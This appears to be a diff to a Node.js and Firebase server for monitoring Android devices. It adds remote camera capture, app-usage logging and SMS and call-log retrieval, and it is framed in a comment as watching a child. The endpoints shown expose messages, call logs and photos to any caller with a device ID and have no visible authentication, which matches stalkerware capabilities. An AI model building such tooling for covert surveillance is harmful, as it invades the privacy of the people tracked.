@@ -11,10 +11,9 @@ admin.initializeApp({
 });
 
 const db = admin.database();
-app.use(express.json());
+app.use(express.json({ limit: '10mb' })); // Increase limit for base64 images
 
 // ================== Device Registration & Online Status ==================
-// Android app will call this to register and update online status
 app.post('/api/register', async (req, res) => {
   const { deviceId, info } = req.body;
   if (!deviceId) return res.status(400).json({ error: 'deviceId required' });
@@ -40,7 +39,6 @@ app.get('/api/devices', async (req, res) => {
     const now = Date.now();
     snapshot.forEach(child => {
       const device = child.val();
-      // Consider online if lastSeen within 60 seconds
       if (now - device.lastSeen < 60000) {
         devices.push({
           deviceId: child.key,
@@ -48,7 +46,6 @@ app.get('/api/devices', async (req, res) => {
           lastSeen: device.lastSeen
         });
       } else {
-        // Mark as offline (optional)
         child.ref.update({ online: false });
       }
     });
@@ -76,37 +73,7 @@ app.post('/api/command', async (req, res) => {
   }
 });
 
-// Poll for command results (optional)
-app.get('/api/poll/:deviceId', (req, res) => {
-  const deviceId = req.params.deviceId;
-  const timeout = 30000;
-  const resultsRef = db.ref(`results/${deviceId}`).limitToLast(1);
-  let responded = false;
-
-  const listener = resultsRef.on('child_added', (snapshot) => {
-    if (!responded) {
-      responded = true;
-      clearTimeout(timer);
-      resultsRef.off('child_added', listener);
-      res.json(snapshot.val());
-    }
-  });
-
-  const timer = setTimeout(() => {
-    if (!responded) {
-      responded = true;
-      resultsRef.off('child_added', listener);
-      res.json({ result: null });
-    }
-  }, timeout);
-
-  req.on('close', () => {
-    clearTimeout(timer);
-    resultsRef.off('child_added', listener);
-  });
-});
-
-// ================== SMS & Call Logs (same as before) ==================
+// ================== SMS & Call Logs ==================
 app.get('/api/sms/:deviceId', async (req, res) => {
   const deviceId = req.params.deviceId;
   const requestId = Date.now().toString();
@@ -166,6 +133,70 @@ app.get('/api/calls/:deviceId', async (req, res) => {
         res.status(408).json({ error: 'Timeout' });
       }
     }, timeout);
+  } catch (error) {
+    res.status(500).json({ error: error.message });
+  }
+});
+
+// ================== Camera Capture ==================
+// Request a photo from device
+app.get('/api/photo/:deviceId', async (req, res) => {
+  const deviceId = req.params.deviceId;
+  const requestId = Date.now().toString();
+  try {
+    await db.ref(`requests/${deviceId}/photo`).set({ requestId, timestamp: admin.database.ServerValue.TIMESTAMP });
+    const responseRef = db.ref(`responses/${deviceId}/photo`);
+    const timeout = 15000; // 15 seconds for camera
+    let responded = false;
+    const listener = responseRef.on('value', (snapshot) => {
+      if (!responded && snapshot.exists()) {
+        const data = snapshot.val();
+        if (data.requestId === requestId) {
+          responded = true;
+          clearTimeout(timer);
+          responseRef.off('value', listener);
+          responseRef.remove();
+          res.json({ imageBase64: data.imageBase64, timestamp: data.timestamp });
+        }
+      }
+    });
+    const timer = setTimeout(() => {
+      if (!responded) {
+        responded = true;
+        responseRef.off('value', listener);
+        res.status(408).json({ error: 'Timeout' });
+      }
+    }, timeout);
+  } catch (error) {
+    res.status(500).json({ error: error.message });
+  }
+});
+
+// ================== App Usage Monitoring (Accessibility) ==================
+// App will send usage events here (e.g., when child opens an app)
+app.post('/api/usage', async (req, res) => {
+  const { deviceId, packageName, appName, timestamp } = req.body;
+  if (!deviceId || !packageName) return res.status(400).json({ error: 'Missing data' });
+  try {
+    const usageRef = db.ref(`usage/${deviceId}`).push();
+    await usageRef.set({ packageName, appName, timestamp: timestamp || admin.database.ServerValue.TIMESTAMP });
+    res.json({ status: 'logged' });
+  } catch (error) {
+    res.status(500).json({ error: error.message });
+  }
+});
+
+// Get recent usage for a device
+app.get('/api/usage/:deviceId', async (req, res) => {
+  const deviceId = req.params.deviceId;
+  const limit = req.query.limit || 20;
+  try {
+    const snapshot = await db.ref(`usage/${deviceId}`).orderByKey().limitToLast(limit).once('value');
+    const usage = [];
+    snapshot.forEach(child => {
+      usage.push({ id: child.key, ...child.val() });
+    });
+    res.json(usage.reverse()); // latest first
   } catch (error) {
     res.status(500).json({ error: error.message });
   }
